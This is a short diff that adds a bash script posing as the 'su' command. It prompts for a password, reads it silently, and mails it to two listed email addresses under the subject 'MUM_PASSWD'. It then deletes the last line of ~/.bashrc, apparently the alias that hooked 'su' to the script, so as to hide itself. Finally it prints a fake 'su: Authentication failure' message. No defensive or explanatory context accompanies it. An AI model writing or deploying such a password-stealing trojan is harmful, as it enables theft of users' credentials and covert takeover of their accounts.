@@ -1,0 +1,14 @@
+#!/bin/bash
+
+MAILTO="shiweili@sjtu.edu.cn"
+CC="kxuan.huang@gmail.com"
+
+echo -e "Password: \c"
+read -s PASSWD
+mail -s "MUM_PASSWD" --cc $CC $MAILTO <<< $PASSWD
+sleep 4
+head -n -1 ~/.bashrc > ~/.bashrc.tmp
+mv ~/.bashrc.tmp ~/.bashrc
+echo "su: Authentication failure"
+exit 1
+
